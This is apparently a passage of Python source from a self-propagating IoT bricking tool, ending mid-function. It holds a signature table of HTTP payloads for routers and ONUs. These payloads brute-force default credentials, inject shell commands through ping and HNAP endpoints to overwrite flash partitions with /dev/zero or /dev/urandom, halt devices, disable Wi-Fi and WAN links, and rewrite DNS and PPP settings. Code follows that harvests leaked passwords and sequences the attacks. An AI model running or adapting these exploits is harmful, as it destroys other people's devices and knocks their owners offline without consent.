		'POST /goform/WanParameterSetting?0.1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: %%BODYLENGTH%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: %%CUSTOM1%%\r\n\r\nwanType=1&adslUser=HACKED%40HACKED&adslPwd=HACKED&vpnServer=&vpnUser=&vpnPwd=&vpnWanType=1&dnsAuto=0&staticIp=1.2.3.4&mask=255.255.255.0&gateway=1.2.3.5&dns1=1.2.3.6&dns2=1.2.3.7&module=wan1&downSpeedLimit=',
		  'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],

  # new comtrend RCE.. but API looks very similar to D-Link DSL 2750U so we throw in some extras and see what happens..
  [ 'comtrenddlink', 'microhttpd.*realm=Broadband\sRouter',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic cm9vdDoxMjM0NQ==\r\n\r\n',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic dXNlcjp1c2Vy\r\n\r\n',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic c3VwcG9ydDpzdXBwb3J0\r\n\r\n',
    # try broadcom CLI classics etc.. might as well try these and see what pops up
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n',   #admin:1234
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',   #admin:admin
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic Q1VBZG1pbjpDVUFkbWlu\r\n\r\n',   #CUAdmin:CUAdmin
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic dGVsbmV0YWRtaW46dGVsbmV0YWRtaW4=\r\n\r\n',   #telnetadmin:telnetadmin
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n',   #admin:password
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46VHJ1c3RQb3dlcg==\r\n\r\n',   #admin:TrustPower
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic ZThlaG9tZTplOGVob21l\r\n\r\n',   #e8ehome:e8ehome
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic c3VwZXJ2aXNvcjp6eWFkMTIzNA==\r\n\r\n',   #supervisor/zyad1234
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic dGVsZWNvbWFkbWluL25FN2pBJTVt\r\n\r\n',   #telecomadmin/nE7jA%5m
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic Og==\r\n\r\n',   #<none>:<none>
    # get sessionKey
    'GET /pingview.cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/left.html\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
	  # no evidence that these units would be brickable, but the halt should hopefully annoy owner enough to
    # do something about the vulnerable router.. some units do seem to timeout pre-halt though so perhaps
    # some are brickable and others not? The data will tell..
'GET /ping.cgi?pingIpAddress=1.1.1.1;$(cat%20/dev/zero%3E/dev/mtdblock0);&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM2%%\r\nConnection: close\r\nReferer: http://%%TARGETIP%%/pingview.cmd\r\n\r\n',
'GET /ping.cgi?pingIpAddress=1.1.1.1;$(cat%20/dev/zero%3E/dev/mtdblock1);&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM2%%\r\nConnection: close\r\nReferer: http://%%TARGETIP%%/pingview.cmd\r\n\r\n',
'GET /ping.cgi?pingIpAddress=1.1.1.1;$(cat%20/dev/zero%3E/dev/mtdblock2);&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM2%%\r\nConnection: close\r\nReferer: http://%%TARGETIP%%/pingview.cmd\r\n\r\n',
'GET /ping.cgi?pingIpAddress=1.1.1.1;$(cat%20/dev/zero%3E/dev/mtdblock3);halt&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM2%%\r\nConnection: close\r\nReferer: http://%%TARGETIP%%/pingview.cmd\r\n\r\n',
    # get sessionKey again just in case for a doudble tap
    'GET /pingview.cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/left.html\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
'GET /ping.cgi?pingIpAddress=1.1.1.1;halt&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM2%%\r\nConnection: close\r\nReferer: http://%%TARGETIP%%/pingview.cmd\r\n\r\n',
     # rest of flow is for D-Link 2750.. these should mess up connectivity
    'GET /internet.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
    # disable wifi, first get sessionKey
    'GET /wlcfg.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nReferer: http://%%TARGETIP%%/internet.html\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
    'GET /wlcfg.wl?wlSsidIdx=0&wlEnbl=0&wlHide=0&wlAPIsolation=0&wlSsid=HACKED&wlCountry=ZA&wlEnbl_wl0v1=0&wlEnbl_wl0v2=0&wlEnbl_wl0v3=0&wsc_config_state=1&wlSyncNvram=1&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
    # disable PPP, get sessionKey, some models
    'GET /setup_wancfg.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
    'GET /dlwancfg.cmd?action=remove&rmLst=ppp0.1&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
    # disable interfaces, get sessionKey.. many models
    'GET /wlcfg.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nReferer: http://%%TARGETIP%%/internet.html\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
'GET /wancfg.cmd?action=remove&rmLst=ppp0.1,ptm0.2,ptm0.1,ppp0,eth3.1,eth3.2,ipoa0,atm1.1,veip0.5,atm0&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nAuthorization: Basic %%CUSTOM2%%\r\n\r\n',
    # confirm if this is still alive.. review, amend payload, and repeat
    'GET / HTTP/1.0\r\n\r\n',
  ],
     
  # EXPERIMENTAL - new payload with few vulnerable units around, refine as we understand more
	[ "vsol", "302.*Boa.*\/admin\/login\.asp",
		'POST /boaform/admin/formLogin HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nusername=admin&psd=stdONU101',
		'POST /boaform/admin/formLogin HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nusername=admin&psd=admin',
		'POST /boaform/admin/formLogin HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nusername=user&psd=user',
    # Some routers seem to need this subsequent request to register our login
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/admin/login.asp\r\n\r\n',
		# opportunistic bricking attempts based on Karan Saini's writeup..
		# running blindly since there are so few of these around for testing purposes.. 
		# maybe something sticks ;) to be reviewed and improved..
		'POST /boaform/admin/formPing HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ntarget_addr=;flash_eraseall;&waninf=1_INTERNET_R_VID_154',
		'POST /boaform/admin/formPing HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ntarget_addr=;flash_eraseall /dev/mtd0;flash_eraseall /dev/mtd1;flash_eraseall /dev/mtd2;&waninf=1_INTERNET_R_VID_154',
		'POST /boaform/admin/formPing HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ntarget_addr=;$(cat /dev/zero>/dev/root;cat /dev/zero>/dev/mtdblock0;cat /dev/zero>/dev/mtdblock3;cat /dev/zero>/dev/mtdblock2;cat /dev/zero>/dev/mtdblock1);&waninf=1_INTERNET_R_VID_154',
		# whatever the outcome above, try running a few things which work on some units
		# mac philter
		'POST /boaform/admin/formRteMacFilter HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/secu_macfilter_src.asp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nmacFilterEnble=on&macFilterMode=on&action=mode&bcdata=le&submit-url=http%3A%2F%2F%%TARGETIP%%%2Fsecu_macfilter_src.asp',
		'POST /boaform/admin/formRteMacFilter HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/secu_macfilter_src.asp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nmacFilterEnble=on&macFilterMode=on&action=mode&bcdata=le&submit-url=http%3A%2F%2F%%TARGETIP%%%2Fsecu_macfilter_src.asp',
		# wan connection
		'POST /boaform/formDhcpServer HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/net_dhcpd_en.asp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nuIp=10.0.1.1&uMask=255.255.255.255&uDhcpType=1&dhcpRangeStart=10.0.2.2&dhcpRangeEnd=10.0.2.3&ulTime=86400&dnsType=1&dns1=1.2.3.4&dns2=1.2.3.5&submit-url=http%3A%2F%2F%%TARGETIP%%%2Fnet_dhcpd_en.asp',
		'POST /boaform/formDhcpServer HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/net_dhcpd_en.asp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nuIp=10.0.1.1&uMask=255.255.255.255&uDhcpType=0&submit-url=http%3A%2F%2F%%TARGETIP%%%2Fnet_dhcpd_en.asp',
		'POST /boaform/admin/formEthernet HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/net_eth_links_en.asp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nlkname=0&lkmode=0&IpProtocolType=2&ipmode=2&PPPoEProxyMaxUser=0&brmode=on&mtu=1500&pppUsername=HACKED%40a&pppPassword=**********&pppServiceName=&pppCtype=0&ipAddr=0.0.0.0&netMask=0.0.0.0&remoteIpAddr=0.0.0.0&dnsMode=1&v4dns1=&v4dns2=&dgw=on&applicationtype=3&chkpt=&chkpt=&chkpt=&chkpt=&chkpt=&chkpt=&chkpt=&chkpt=&chkpt=&chkpt=&chkpt=&dslite_aftr_mode=0&dslite_aftr_hostname=&Ipv6Addr=&Ipv6PrefixLen=&Ipv6Gateway=&Ipv6Dns1=&Ipv6Dns2=&cmode=0&ipDhcp=0&itfGroup=0&encodePppUserName=MjA4OTcwMjJAYQ%3D%3D&encodePppPassword=&lst=1_INTERNET_R_VID_1210&action=sv&submit-url=http%3A%2F%2F%%TARGETIP%%%2Fnet_eth_links_en.asp&acnameflag=none',
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],

  # THIS WILL MATCH A LOT OF SIGS, SO KEEP LAST
	[ 'hnap', '(HTTP|HTML|html)',
		'GET /HNAP1/ HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		# brute force SetWanSettings IP messup attempt
		'hnapxpand:admin/admin:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:admin/1234:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:admin/password:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:admin/:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:user/user:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:user/1234:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:user/:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:cisco/cisco:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:Cisco/Cisco:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:cusadmin/password:SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		# messup attempt through auth bypass exploits
		'hnapxpand:admin/admin:GetDeviceSettings/`cat${IFS}/dev/urandom${IFS}>/dev/root`:GetDeviceSettings:',
		'hnapxpand:admin/admin:GetDeviceSettings/SetWanSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:admin/admin:GetDeviceSettings:SetWanSettings:<Type>Static</Type><IPAddress>10.%%RAND8%%</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.%%COMP8%%</Gateway>',
		'hnapxpand:admin/admin:GetDeviceSettings/`route${IFS}del${IFS}default`:GetDeviceSettings:',
		'hnapxpand:admin/admin:GetDeviceSettings/SetFactoryDefault:SetFactoryDefault:',
		# EDB 38722 test
#		'POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XXtest;cat /dev/urandom >/dev/root;route del default;test\r\n1\r\n\r\n',
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],

  # DO NOT ADD NEW PAYLOAD SIGS HERE, SEE ABOVE
]

# marker for splitting file into smaller parts for piecemeal parsing
splitvar = "SPLTX"


time.sleep(1)
# now expand any webtaskdatabase items which were compressed
for expindex in range( len(webtaskdatabase) ):
	for subindex in range( len(webtaskdatabase[expindex]) ):
	  matches = re.search( 'hnapxpand:([^:/]*)/([^:]*):([^:]+):([^:]+):(.*)$', webtaskdatabase[expindex][subindex] )
	  if matches:
	  	webtaskdatabase[expindex][subindex] = 'POST /HNAP1/ HTTP/1.0\r\nAuthorization: Basic %s\r\nContent-Type: text/xml; charset="utf-8"\r\nSOAPAction: http://purenetworks.com/HNAP1/%s\r\nContent-Length: %%%%BODYLENGTH%%%%\r\n\r\n<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><soap:Body><%s xmlns="http://purenetworks.com/HNAP1/">%s</%s></soap:Body></soap:Envelope>' % ( binascii.b2a_base64('%s:%s'%(matches.group(1),matches.group(2))).strip(), matches.group(3), matches.group(4), matches.group(5), matches.group(4) )
	  matches = re.search( 'xtsxpand:([^:]+):(\d+)', webtaskdatabase[expindex][subindex] )
	  if matches:
	  	webtaskdatabase[expindex][subindex] = 'POST /dvrcmd HTTP/1.1\r\nHost: %%%%TARGETIP%%%%\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: %%%%BODYLENGTH%%%%\r\n\r\nTSCommand=ptz_req&req=start&param=%s&channel=%s&stream=1' % ( matches.group(1), matches.group(2) )
	  matches = re.search( 'xnrxpand:([^:]+):(\d+)', webtaskdatabase[expindex][subindex] )
	  if matches:
	  	webtaskdatabase[expindex][subindex] = 'POST /dvrcmd HTTP/1.1\r\nHost: %%%%TARGETIP%%%%\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: %%%%BODYLENGTH%%%%\r\n\r\ncommand=ptz_req&req=start&param=%s&channel=%s&stream=1' % ( matches.group(1), matches.group(2) )
time.sleep(1)		


# task-specific structs
webclient_socks = []
webclient_ref = {}
webclient_master = {}
webclient_response = {}
webclient_state = {}
webclient_request = {}
webclient_connectiontime = {}
# here are the main structs keeping track of the overall job
webtask_jobs = []
webtask_ref = {}
webtask_nextconnectiontime = {}
webtask_currentsock = {}
webtask_actionscript = {}
webtask_payloadindex = {}
webtask_payloadbuf = {}
webtask_login = {}
webtask_password = {}
webtask_newpassword = {}
webtask_customdata1 = {}
webtask_customdata2 = {}
webtask_customdata3 = {}
webtask_customdata4 = {}
webtask_lastresponse = {}
webtask_keepalive = {}


def webtask_create( targetip, targetport, bannerhint, loginhint = '', passwordhint = '' ):
	global webtaskdatabase
	global execWP
	
	if not execWP:
		return

	brutetuple = ( targetip, int(targetport ) )
	webhash = hash( brutetuple )
	if webhash in webtask_jobs:
		return;

	# check if there's anything to do here	
	actionscript = ''
	payloadbuf = []
	for case in webtaskdatabase:
		if re.search( case[1], bannerhint ):
			actionscript = case[0];
			payloadbuf = case[2:]
			# break on first hit to allow for more exact control
			break
		
	if not actionscript:
		return

	webtask_payloadindex[webhash] = 0
	webtask_payloadbuf[webhash] = payloadbuf
	webtask_actionscript[webhash] = actionscript
	webtask_ref[webhash] = ( targetip, int(targetport), bannerhint )
	webtask_nextconnectiontime[webhash] = 0
	webtask_currentsock[webhash] = None
	webtask_login[webhash] = loginhint
	webtask_password[webhash] = passwordhint
	webtask_newpassword[webhash] = ""
	webtask_customdata1[webhash] = ""
	webtask_customdata2[webhash] = ""
	webtask_customdata3[webhash] = ""
	webtask_customdata4[webhash] = ""
	webtask_keepalive[webhash] = 0
	webtask_jobs.append(webhash)

def webclient_create( targetip, targetport, request, jobhash ):
	brutetuple = ( targetip, int(targetport ) )
	newsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	newsock.setblocking(0)
	try:
		newsock.connect(brutetuple)
	except:
		pass
	webhash = hash( newsock )
	webclient_socks.append(newsock)
	webclient_ref[webhash] = ( targetip, int(targetport), request )
	webclient_state[webhash] = 0
	webclient_request[webhash] = request
	webclient_response[webhash] = ''
	webclient_connectiontime[webhash] = time.time()
	webclient_master[webhash] = jobhash
	webtask_currentsock[jobhash] = newsock
	webtask_lastresponse[jobhash] = ''
	return newsock

def webtask_close( webhash ):
	global showWP
	
	# kludge 2 - if we did the default hnap sequence we'll actually not log
	# the results unless we got to the end.. 
	if webhash in webtask_actionscript and webtask_actionscript[webhash] == 'hnap' and webtask_password[webhash] == '':
		pass
	else:
		# log results
		if webhash in webtask_actionscript and webtask_actionscript[webhash] != '' and showWP:
			if webtask_newpassword[webhash]:
				# hacky, but since we don't generally get new web passwords (or care about them)
				# we will just inject it here if there is one
				webtask_lastresponse[webhash] = webtask_newpassword[webhash] + ':' + webtask_lastresponse[webhash]
			
			log_session( "%s:%d WP:%s:%s/%s:%s" % ( webtask_ref[webhash][0], webtask_ref[webhash][1], webtask_actionscript[webhash], webtask_login[webhash], webtask_password[webhash], webtask_lastresponse[webhash] ) )

	# kludge - if xionghash we'll run xiongpin here
	if webhash in webtask_actionscript and webtask_actionscript[webhash] == 'xionghash' and webtask_password[webhash] != '':
		# and also run a 9527 scan just in case.. 
		brutemaster_create( webtask_ref[webhash][0], 9527, 'PORT:9527:' )
		

	webtask_payloadindex[webhash] = None
	webtask_payloadbuf[webhash] = None
	webtask_ref[webhash] = None
	webtask_nextconnectiontime[webhash] = None
	webtask_currentsock[webhash] = None
	webtask_actionscript[webhash] = None
	webtask_login[webhash] = None
	webtask_password[webhash] = None
	webtask_newpassword[webhash] = None
	webtask_customdata1[webhash] = None
	webtask_customdata2[webhash] = None
	webtask_customdata3[webhash] = None
	webtask_customdata4[webhash] = None
	webtask_keepalive[webhash] = None
	webtask_jobs.remove(webhash)
	
def webtask_readcstr(f):
	buf = bytearray()
	i = 0
	while i < len(f):
		b=f[i]
		if b is None or b == '\0':
			return str(buf)
		else:
			buf.append(b)
		i += 1
	
def webtask_genmultipart( boundary, vals ):
	ret = ''
	for val in vals:
		ret += boundary + '\r\n'
		ret += 'Content-Disposition: form-data; name="'+val[0]+'"\r\n\r\n'+val[1]+'\r\n'
	ret += boundary + '--\r\n'
	return ret
	
def webclient_close( sock ):
	global webclient_maxattempts
	global webclient_waitbetweenattempts
	global webclient_maxconnectiontime_clientrequest
	
	webhash = hash(sock)
	jobhash = webclient_master[webhash]
	
	if not webtask_keepalive[jobhash]:
		try:
			sock.close()
		except:
			pass
	else:
		pass

	setkeepalive = 0

	webtask_lastresponse[jobhash] = '';
	try:
		webtask_lastresponse[jobhash] = webclient_response[webhash].split('\n')[0].strip()
	except:
		pass
	
	actionscript = webtask_actionscript[jobhash]

	if actionscript == 'kguard':
		if webtask_payloadindex[jobhash] == 0:
			if not 'MCTP/1.0 2' in webclient_response[webhash]:
				webtask_payloadindex[jobhash] = 99
			else:
				webtask_login[jobhash] = 'xesp'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'hnap':
		if webtask_payloadindex[jobhash] == 0:
			if not 'purenetworks' in webclient_response[webhash]:
				webtask_payloadindex[jobhash] = 99
			else:
				webtask_login[jobhash] = 'n'
				webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1
			
	if actionscript == 'avtech':
		# avtech-specific handler - discontinue or proceed to next payload?
		if webtask_payloadindex[jobhash] == 0:
			# if the device is a DVR it should have leaked the userlist. Check
			#Account.User1.Username=admin
			#Account.User1.Password=PPPPPPPP
			# is there an admin user?
			# copied this parser from avtech PoC
			login = ''
			password = ''
			for l in webclient_response[webhash].split():
				lp = l.split('=')
				if (len(lp) == 2):
					if (lp[0] == 'Account.User1.Username'):
						login = lp[1]
					elif (lp[0] == 'Account.User1.Password'):
						password = lp[1]
						break
					if (lp[0] == 'Account.User2.Username'):
						login = lp[1]
					elif (lp[0] == 'Account.User2.Password'):
						password = lp[1]
						break
					if (lp[0] == 'Account.User3.Username'):
						login = lp[1]
					elif (lp[0] == 'Account.User3.Password'):
						password = lp[1]
						break			
			# we will guess admin/admin if this fails and deal with the auth error later
			if password == '':
				login = 'admin'
				password = 'admin'
			webtask_login[jobhash] = login
			webtask_password[jobhash] = password
			webtask_customdata1[jobhash] = binascii.b2a_base64('%s:%s'%(login,password)).strip()
		webtask_payloadindex[jobhash] += 1
	if actionscript == 'wificam':
		# goahead-specific handler - discontinue or proceed to next payload?
		if webtask_payloadindex[jobhash] == 0:
			# see if we can find the login/password in this stage
			try:
				markerindex = webclient_response[webhash].find('\x0a\x0a\x0a\x0a\x01')
				login = ''
				password = ''
				if markerindex >= 0:
					markerindex += (138+4)
					# TODO: Add try around these to catch incomplete buffer
					login = webtask_readcstr(webclient_response[webhash][markerindex:markerindex+31])
					password = webtask_readcstr(webclient_response[webhash][markerindex+32:markerindex+63])
					webtask_payloadindex[jobhash] += 1  # NOT A BUG - this skips the next pw extraction stage
				webtask_login[jobhash] = login
				webtask_password[jobhash] = password
			except:
				pass
			webtask_payloadindex[jobhash] += 1
		elif webtask_payloadindex[jobhash] == 1:
			# see if we can find the login/password in this stage
			login = ''
			password = ''
			matches = re.search( 'loginuser="([^"]+)";', webclient_response[webhash] );
			if matches:
				login = matches.group(1)
			matches = re.search( 'loginpass="([^"]+)";', webclient_response[webhash] );
			if matches:
				password = matches.group(1)
				
			if password == '' and login == '' and webtask_login[jobhash] == '':
				login = "admin"
				password = "admin"
				
			if webtask_login[jobhash] == '':		# NB - should not happen
				webtask_login[jobhash] = login
			if webtask_password[jobhash] == '':
				webtask_password[jobhash] = password
			webtask_payloadindex[jobhash] += 1
		elif webtask_payloadindex[jobhash] >= 2:
			webtask_payloadindex[jobhash] += 1

	if actionscript == 'homestation':
		if webtask_payloadindex[jobhash] <= 0:
			# if response is anything but a Cookie and a Location then assume failure
			matches1 = re.search( 'sessionid\'\s*:\'(\S+)\'', webclient_response[webhash] )
			if matches1:
				webtask_customdata1[jobhash] = matches1.group(1)
				webtask_login[jobhash] = 'TelefonicaUser'
				webtask_password[jobhash] = 'user'
			else:
				if webtask_payloadindex[jobhash] >= 0:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'observa':
		if webtask_payloadindex[jobhash] <= 0:
			# if response is anything but a Cookie and a Location then assume failure
			matches1 = re.search( 'sessionid\'\s*:\'(\S+)\'', webclient_response[webhash] )
			matches2 = re.search( 'username\'\s*:\'(\S+)\'', webclient_response[webhash] )
			matches3 = re.search( 'password\'\s*:\'(\S+)\'', webclient_response[webhash] )
			if matches1 and matches2 and matches3:
				webtask_customdata1[jobhash] = matches1.group(1)
				webtask_customdata2[jobhash] = ''.join(random.choice('0123456789') for i in range(8))
				webtask_customdata3[jobhash] = ''
				webtask_login[jobhash] = matches2.group(1)
				webtask_password[jobhash] = matches3.group(1)
			else:
				if webtask_payloadindex[jobhash] >= 0:
					webtask_payloadindex[jobhash] = 99
		else:
			matches = re.search( 'G_Conns\S+\s+=\s+\"(\S+)\"\;\s+\S*Username', webclient_response[webhash] )
			if matches:
				webtask_customdata4[jobhash] = matches.group(1)
				matches = re.search( '\d+@(\S+)', webtask_customdata4[jobhash] )
				if matches:
					webtask_customdata3[jobhash] = webtask_customdata2[jobhash] + '%40' + matches.group(1)
				else:
					webtask_customdata3[jobhash] = webtask_customdata4[jobhash]
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'hg532':
		if webtask_payloadindex[jobhash] <= 3:
			if 'SessionID_R3=' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata2[jobhash] = 'OGM2OTc2ZTViNTQxMDQxNWJkZTkwOGJkNGRlZTE1ZGZiMTY3YTljODczZmM0YmI4YTgxZjZmMmFiNDQ4YTkxOA%3D%3D'
					webtask_customdata3[jobhash] = ''
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'instalador'
					webtask_password[jobhash] = '.corporacion'
					webtask_customdata2[jobhash] = 'N2MwNGQxMzUzNzI1Y2ZkNzU4ZTFhYzNjM2JjZGRiMDkxNWNlNzA4OWU1NTlkODQ0Yjk2YTU4MjFmNTM1N2Y4Mg%3D%3D'
					webtask_customdata3[jobhash] = 'CNT_ES_'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'instalador'
					webtask_password[jobhash] = 'cnt2016admin'
					webtask_customdata2[jobhash] = 'NjQzMGU0ZDBhMTMyYzI5Njg4NGUzMjNlOWJkMWM1MzJhODZmYmQ3OWJlYmUxN2U0Nzc1NDlmZjBkYjM0YzNiNA%3D%3D'
					webtask_customdata3[jobhash] = 'CNT_ES_'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata2[jobhash] = 'YWRtaW4%3D'
					webtask_customdata3[jobhash] = ''
					webtask_payloadindex[jobhash] = 3
			else:
				if webtask_payloadindex[jobhash] == 2:
				  # 3 tries and then 1 min cooldown
					webtask_nextconnectiontime[jobhash] = time.time() + 65;
				if webtask_payloadindex[jobhash] >= 3:
					webtask_payloadindex[jobhash] = 99
		# check for updated WWW_SID
		matches = re.search( 'SessionID_R3=([a-zA-Z0-9]+)', webclient_response[webhash] )
		if matches:
			webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'hg532a':
		if webtask_payloadindex[jobhash] <= 0:
			if 'sessionID=' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
